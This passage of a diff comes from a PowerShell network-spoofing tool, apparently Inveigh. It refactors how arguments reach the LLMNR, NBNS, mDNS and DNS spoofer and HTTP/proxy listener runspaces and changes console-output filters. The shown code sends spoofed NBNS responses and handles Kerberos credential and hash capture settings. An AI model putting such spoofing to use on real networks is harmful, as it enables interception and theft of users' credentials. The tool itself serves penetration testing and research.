                 $NBNS_UDP_client.Connect($NBNS_destination_endpoint)
                 $NBNS_UDP_client.Send($NBNS_response_packet,$NBNS_response_packet.Length)
                 $NBNS_UDP_client.Close()
                 $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
                 $NBNS_UDP_client.Client.ReceiveTimeout = 5000
-                $NBNS_response_message = "[response sent]"
-            }
-            else
-            {
-                $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS"
-                $NBNS_response_type = $NBNS_response_message[0]
-                $NBNS_response_message = $NBNS_response_message[1]
             }
 
             if($NBNS_request_data)                   
             {
-                 $inveigh.output_queue.Add("$NBNS_response_type [$(Get-Date -format s)] NBNS request $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message") > $null    
+                $inveigh.output_queue.Add("$NBNS_response_type [$(Get-Date -format s)] NBNS request $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message") > $null    
             }
 
             $NBNS_request_data = $null
@@ -5870,7 +5899,7 @@ function HTTPListener
         $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
         $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
         $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(
-        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
+        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
         $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
         $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
         $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
@@ -5896,7 +5925,7 @@ function HTTPSListener
         $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
         $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
         $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(
-        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
+        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
         $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
         $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
         $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
@@ -5922,7 +5951,7 @@ function ProxyListener
         $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
         $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
         $HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(
-        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
+        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
         $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
         $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
         $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
@@ -5942,13 +5971,11 @@ function SnifferSpoofer
     $sniffer_powershell.AddScript($kerberos_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($SMB_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($DNS).AddArgument($DNSTTL).AddArgument(
-        $DNS_response_message).AddArgument($EvadeRG).AddArgument($IP).AddArgument($Kerberos).AddArgument(
-        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument($LLMNR).AddArgument(
-        $LLMNR_response_message).AddArgument($LLMNRTTL).AddArgument($mDNS).AddArgument(
-        $mDNS_response_message).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument($NBNS).AddArgument(
-        $NBNS_response_message).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument(
-        $output_directory).AddArgument($Pcap).AddArgument($PcapPortTCP).AddArgument(
-        $PcapPortUDP).AddArgument($SMB).AddArgument($SpooferHostsIgnore).AddArgument(
+        $EvadeRG).AddArgument($Inspect).AddArgument($IP).AddArgument($Kerberos).AddArgument($KerberosCount).AddArgument(
+        $KerberosCredential).AddArgument($KerberosHash).AddArgument($LLMNR).AddArgument(
+        $LLMNRTTL).AddArgument($mDNS).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument($NBNS).AddArgument(
+        $NBNSTTL).AddArgument($NBNSTypes).AddArgument($output_directory).AddArgument($Pcap).AddArgument(
+        $PcapTCP).AddArgument($PcapUDP).AddArgument($SMB).AddArgument($SpooferHostsIgnore).AddArgument(
         $SpooferHostsReply).AddArgument($SpooferIP).AddArgument($SpooferIPsIgnore).AddArgument(
         $SpooferIPsReply).AddArgument($SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument(
         $SpooferLearningInterval).AddArgument($SpooferNonprintable).AddArgument(
@@ -5966,7 +5993,7 @@ function DNSSpoofer
     $DNS_spoofer_powershell.Runspace = $DNS_spoofer_runspace
     $DNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $DNS_spoofer_powershell.AddScript($DNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
-        $DNSTTL).AddArgument($DNS_response_message).AddArgument($SpooferIP) > $null
+        $DNSTTL).AddArgument($SpooferIP) > $null
     $DNS_spoofer_powershell.BeginInvoke() > $null
 }
 
@@ -5980,8 +6007,8 @@ function LLMNRSpoofer
     $LLMNR_spoofer_powershell.Runspace = $LLMNR_spoofer_runspace
     $LLMNR_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $LLMNR_spoofer_powershell.AddScript($LLMNR_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
-        $LLMNR_response_message).AddArgument($LLMNRTTL).AddArgument($SpooferIP).AddArgument(
-        $SpooferHostsReply).AddArgument($SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
+        $LLMNRTTL).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
+        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
         $SpooferIPsIgnore).AddArgument($SpooferNonprintable) > $null
     $LLMNR_spoofer_powershell.BeginInvoke() > $null
 }
@@ -5996,9 +6023,8 @@ function mDNSSpoofer
     $mDNS_spoofer_powershell.Runspace = $mDNS_spoofer_runspace
     $mDNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $mDNS_spoofer_powershell.AddScript($mDNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
-        $mDNS_response_message).AddArgument($mDNSTTL).AddArgument($mDNSTypes).AddArgument($SpooferIP).AddArgument(
-        $SpooferHostsReply).AddArgument($SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
-        $SpooferIPsIgnore) > $null
+        $mDNSTTL).AddArgument($mDNSTypes).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
+        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore) > $null
     $mDNS_spoofer_powershell.BeginInvoke() > $null
 }
 
@@ -6012,9 +6038,9 @@ function NBNSSpoofer
     $NBNS_spoofer_powershell.Runspace = $NBNS_spoofer_runspace
     $NBNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $NBNS_spoofer_powershell.AddScript($NBNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
-        $IP).AddArgument($NBNS_response_message).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument(
-        $SpooferIP).AddArgument($SpooferHostsIgnore).AddArgument($SpooferHostsReply).AddArgument(
-        $SpooferIPsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferNonprintable) > $null
+        $IP).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument($SpooferIP).AddArgument(
+        $SpooferHostsIgnore).AddArgument($SpooferHostsReply).AddArgument($SpooferIPsIgnore).AddArgument(
+        $SpooferIPsReply).AddArgument($SpooferNonprintable) > $null
     $NBNS_spoofer_powershell.BeginInvoke() > $null
 }
 
@@ -6175,7 +6201,7 @@ try
                         $inveigh.console_queue.RemoveAt(0)
                     } 
 
-                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
+                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                     {
                     
                         if($ConsoleOutput -ne "Low")
@@ -6713,7 +6739,7 @@ if($inveigh.tool -ne 1)
                         $inveigh.console_queue.RemoveAt(0)
                     }
 
-                    {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
+                    {$_ -like "*spoofer disabled]" -or $_ -like "*local request]" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                     {
 
                         if($ConsoleOutput -eq 'Y')
@@ -6725,7 +6751,7 @@ if($inveigh.tool -ne 1)
 
                     } 
 
-                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
+                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                     {
                     
                         if($ConsoleOutput -ne "Low")
